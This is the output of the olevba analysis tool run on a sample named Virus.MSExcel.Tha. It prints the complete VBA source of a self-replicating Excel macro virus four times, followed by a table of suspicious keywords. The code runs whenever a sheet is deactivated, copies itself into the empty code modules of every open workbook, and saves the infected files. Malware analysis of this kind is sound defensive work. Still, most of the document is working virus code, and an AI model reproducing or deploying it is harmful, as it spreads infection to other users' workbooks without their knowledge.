olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Tha
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: ./Virus.MSExcel.Tha - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_Deactivate()

Dim OurCode, ThaClass As String
Dim i As Integer
Dim Saved As Boolean

ThaClass = "DieseArbeitsmappe"

OurCode = Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

For i = 1 To Application.Workbooks.Count

  Saved = False
  
  For j = 1 To Application.Workbooks.Item(i).VBProject.VBComponents.Count
  
    If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines = 0 Then
    
      If Application.Workbooks.Item(i).Path <> "" And Application.Workbooks.Item(i).Saved = True And Saved = False Then Saved = True
    
      Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.InsertLines 1, OurCode
      
      If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).Name = ThaClass Then
        Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Workbook_Deactivate()"
      Else
        Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next j
  
  If Saved = True Then Application.Workbooks.Item(i).Save

Next i

End Sub

-------------------------------------------------------------------------------
VBA MACRO Лист1.cls 
in file: ./Virus.MSExcel.Tha - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_Deactivate()

Dim OurCode, ThaClass As String
Dim i As Integer
Dim Saved As Boolean

ThaClass = "DieseArbeitsmappe"

OurCode = Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

For i = 1 To Application.Workbooks.Count

  Saved = False
  
  For j = 1 To Application.Workbooks.Item(i).VBProject.VBComponents.Count
  
    If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines = 0 Then
    
      If Application.Workbooks.Item(i).Path <> "" And Application.Workbooks.Item(i).Saved = True And Saved = False Then Saved = True
    
      Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.InsertLines 1, OurCode
      
      If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).Name = ThaClass Then
        Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Workbook_Deactivate()"
      Else
        Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next j
  
  If Saved = True Then Application.Workbooks.Item(i).Save

Next i

End Sub

-------------------------------------------------------------------------------
VBA MACRO Лист2.cls 
in file: ./Virus.MSExcel.Tha - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_Deactivate()

Dim OurCode, ThaClass As String
Dim i As Integer
Dim Saved As Boolean

ThaClass = "DieseArbeitsmappe"

OurCode = Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

For i = 1 To Application.Workbooks.Count

  Saved = False
  
  For j = 1 To Application.Workbooks.Item(i).VBProject.VBComponents.Count
  
    If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines = 0 Then
    
      If Application.Workbooks.Item(i).Path <> "" And Application.Workbooks.Item(i).Saved = True And Saved = False Then Saved = True
    
      Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.InsertLines 1, OurCode
      
      If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).Name = ThaClass Then
        Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Workbook_Deactivate()"
      Else
        Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next j
  
  If Saved = True Then Application.Workbooks.Item(i).Save

Next i

End Sub

-------------------------------------------------------------------------------
VBA MACRO Лист3.cls 
in file: ./Virus.MSExcel.Tha - OLE stream: '_VBA_PROJECT_CUR/VBA/Лист3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Worksheet_Deactivate()

Dim OurCode, ThaClass As String
Dim i As Integer
Dim Saved As Boolean

ThaClass = "DieseArbeitsmappe"

OurCode = Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.Lines(1, Application.ThisWorkbook.VBProject.VBComponents.Item(1).CodeModule.CountOfLines)

For i = 1 To Application.Workbooks.Count

  Saved = False
  
  For j = 1 To Application.Workbooks.Item(i).VBProject.VBComponents.Count
  
    If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.CountOfLines = 0 Then
    
      If Application.Workbooks.Item(i).Path <> "" And Application.Workbooks.Item(i).Saved = True And Saved = False Then Saved = True
    
      Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.InsertLines 1, OurCode
      
      If Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).Name = ThaClass Then
        Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Workbook_Deactivate()"
      Else
        Application.Workbooks.Item(i).VBProject.VBComponents.Item(j).CodeModule.ReplaceLine 1, "Private Sub Worksheet_Deactivate()"
      End If

    End If
    
  Next j
  
  If Saved = True Then Application.Workbooks.Item(i).Save

Next i

End Sub

-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible - 8
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

